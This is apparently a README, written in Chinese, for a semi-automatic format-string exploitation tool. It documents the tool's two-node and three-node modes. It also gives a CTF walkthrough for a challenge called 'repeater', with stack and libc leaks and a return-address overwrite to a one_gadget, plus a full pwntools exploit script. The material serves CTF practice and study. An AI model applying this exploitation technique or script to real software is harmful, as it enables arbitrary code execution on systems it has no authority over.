# Format-Exploit
Semi-Automatic String Formatting Exploitation Tool


## 整体介绍

- 使用需能够多次利用格式化字符串攻击，脚本针对于 **堆格式化字符串** 或者 **bss段格式化字符串** 。
- 脚本分为两种攻击模式：双节点模式、三节点模式
	- 双节点模式
		- 参数：Value、Address、Off1、Off2、Bytes_Off=2、Address_Bytes_Off=None、Value_Bytes_Off=None、Func_Send=None、**kwargs
			- Value：所需覆盖Address地址中的值
			- Address：所需覆盖的地址（Address需为Stack上的值）
			- Off1 与 Off2：节点1与节点2关于rsp的内存单元偏移
			- Bytes_Off：默认值为2，可设置为\[1,2,4]其中任意一个。控制着Address与Value的修改偏移量
			- Address_Bytes_Off：默认为None，可设置为\[1,2,4]其中任意一个。单独控制着Address的修改偏移量，不设则默认使用Bytes_Off
				- Value_Bytes_Off：默认为None，可设置为\[1,2,4]其中任意一个。单独控制着Value的修改偏移量，不设则默认使用Bytes_Off 
			- Func_Send（必设）：默认为None，是与程序进行交互的函数
				- [[Func_Send格式]]
			- **kwargs：Func_Send中除了payload剩下的参数
		- 功能：修改Address（Stack上的值，与main栈帧的偏移不能太大）的值为Value
	- 三节点模式
		 - 参数：Value、Address、Off3_Address、Off1、Off2、Off3、Bytes_Off、 First_Address_Bytes_Off=None、First_Value_Bytes_Off=None、Second_Address_Bytes_Off=1、Second_Value_Bytes_Off=1
			 - Value：所需覆盖Address地址中的值、
			 - Address：所需覆盖的地址（Address需为Stack上的值）
			 - Off3_Address：中间值，off3的真实地址。使用其将Address（任意可写地址）写入节点4
			 - Off1、Off2 与 Off3：节点1、节点2与节点3关于rsp的内存单元偏移
			 - Bytes_Off：默认值为2，可设置为\[1,2,4\]其中任意一个。控制着其中两步的Address与Value的修改偏移量
			 - First_Address_Bytes_Off：默认为None，可设置为\[1,2,4\]其中任意一个，控制着将第1步的Address修改偏移量
			 - First_Value_Bytes_Off：默认为None，可设置为\[1,2,4]其中任意一个，控制着将第1步的Value修改偏移量
			 - Second_Address_Bytes_Off：默认为None，可设置为\[1,2,4]其中任意一个，控制着将第1步的Address修改偏移量
			 - Second_Value_Bytes_Off：默认为None，可设置为\[1,2,4]其中任意一个，控制着将第1步的Value修改偏移量
			 - Func_Send（必设）：默认为None，是与程序进行交互的函数
				- [[Func_Send格式]]
			- **kwargs：Func_Send中除了payload剩下的参数
		- 功能：修改Address（任意可写地址）的值为Value

## 使用样例

### 脚本源码

![[Format.py]]

### 题目：repeater （TwoOffFormat使用样例）

![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704134443.png)
不考虑_exit(0)，则思路如下
- 泄露stack地址，获取i地址
- 劫持i为0xff000000
- 劫持ret地址为one_gadget
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704135055.png)
可以看到，偏移为13的值为一个栈地址，打印如下
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704135341.png)
此地址为Node2的值，计算偏移：p (0x7ffcd91c9498 - (long)$rsp) / 8 + 6 = 41
此时可以计算Node1的值：0x7ffcd91c9498 - 8 * (41-13) = 0x7ffcd91c93b8
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704140754.png)
进而得到i的地址，也就是rsp的值
调用Format_Attack类
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704140557.png)
修改i变量的最高字节为ff，使之变为负数
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704140711.png)
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704140456.png)
修改成功！
接下来泄露libc基址，直接将ret地址的值覆盖为one_gadget即可
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704142342.png)
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704142414.png)
ret成功被覆盖成为one_gadget
![img](https://github.com/CPerdst/Format-Exploit/blob/main/Images/Pasted%20image%2020230704142448.png)

### 题目exp

``` python
from pwn import *
from Format import *
context.terminal=['tmux','splitw','-h']
context.arch='amd64'

p=process('./pwn')
libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.31-0ubuntu9.10_amd64/libc-2.31.so')
elf=ELF('./pwn')
FA=Format_Attack(flag=7)

def pt(payload=None,**kwargs):
    p.sendafter(b'Please input the length: ',str(kwargs['size']))
    p.sendafter(b'Please input the content: ',payload)

# 泄露Stack地址，计算i变量真实地址
pt(payload='%13$p',size=0x400)
Second_Node_Address=int(p.recv(14).ljust(8,b'\x00'),16)
i_Attr_Addr=Second_Node_Address - 8 * (41-6)
ret_Addr=i_Attr_Addr + 8 * 5
log.success(f'Second_Node_Address => {hex(Second_Node_Address)}')
log.success(f'i_Attr_Addr => {hex(i_Attr_Addr)}')

FA.TwoOffFormat(0xff,i_Attr_Addr+3,13,41,address_bytes_off=2,value_bytes_off=1,func_send=pt,size=0x400)
pt(payload='%11$p'+'\x00'*0x10,size=0x400)
libc.address=int(p.recv(14).ljust(8,b'\x00'),16)-243-libc.sym.__libc_start_main
gadget=libc.address+0xe3afe
log.success(f'libc.address => {hex(libc.address)}')
log.success(f'gadget => {hex(gadget)}')
FA.TwoOffFormat(gadget,ret_Addr,13,41,func_send=pt,size=0x400)

p.interactive()
```

